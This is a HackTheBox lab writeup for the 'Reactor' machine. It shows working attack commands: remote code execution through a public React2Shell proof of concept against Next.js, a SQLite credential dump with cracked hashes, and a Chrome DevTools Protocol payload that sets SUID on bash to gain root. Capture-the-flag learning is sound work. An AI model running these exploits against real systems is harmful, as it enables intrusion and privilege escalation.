---
title: "Reactor — HackTheBox Writeup"
description: "CVE-2025-55182 (React2Shell) RCE to SQLite cred dump, SSH, and CDP root escalation on HackTheBox."
date: "2025-07-02"
tags: ["hackthebox", "rce", "privilege-escalation", "cdp"]
image: "/images/reactor-card.svg"
slug: "reactor-htb-writeup"
---

# Reactor — HackTheBox Writeup

**Machine:** Reactor  
**Difficulty:** Easy  
**OS:** Linux  

---

## Attack Chain

```
Recon → CVE-2025-55182 (React2Shell) RCE → SQLite cred dump → MD5 crack → SSH → CDP root escalation
```

---

## 1. Reconnaissance

```
nmap -sC -sV 10.129.4.249
```

| Port | Service | Detail |
|------|---------|--------|
| 22   | SSH     | OpenSSH 9.6p1 |
| 3000 | HTTP    | Next.js 15.0.3 — ReactorWatch |

---

## 2. Initial Access — CVE-2025-55182 (React2Shell)

Next.js 15.0.3 is vulnerable to **CVE-2025-55182**, an unauthenticated RCE via the React Server Components Flight protocol.

Used the [react2shell-poc](https://github.com/p3ta00/react2shell-poc) exploit:

```bash
python3 react2shell-poc.py -t http://10.129.4.249:3000 -c "id"
```

Result: `uid=999(node) gid=988(group) groups=988(node)`

## 3. Database Extraction

Found SQLite database at `/opt/reactor-app/reactor.db`:

```bash
python3 react2shell-poc.py -t http://10.129.4.249:3000 -c "sqlite3 /opt/reactor-app/reactor.db '.dump'"
```

Extracted MD5 hashes:
| Username  | Hash |
|-----------|------|
| admin     | `a203b22191d744a4e70ada5c101b17b8` |
| engineer  | `39d97110eafe2a9a68639812cd271e8e` |

Cracked engineer hash: **`reactor1`**

## 4. SSH Access

```bash
ssh engineer@10.129.4.249
```

Retrieved **user flag**.

## 5. Privilege Escalation — CDP Exploit

Found root-owned Node.js process with `--inspect` on localhost:9229:

```
root  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

Forwarded port to local machine:

```bash
ssh -L 9229:127.0.0.1:9229 engineer@10.129.4.249
```

Exploited via Chrome DevTools Protocol to set SUID on bash:

```python
import json, websocket
ws = websocket.create_connection('ws://127.0.0.1:9229/...')
cmd = json.dumps({'id': 1, 'method': 'Runtime.evaluate',
  'params': {'expression': "process.mainModule.require('child_process').execSync('chmod u+s /bin/bash').toString()"}})
ws.send(cmd)
```

Back in SSH:

```bash
bash -p
whoami  # root
cat /root/root.txt
```

Retrieved **root flag**.

---

**Flags captured: user.txt + root.txt** ✅
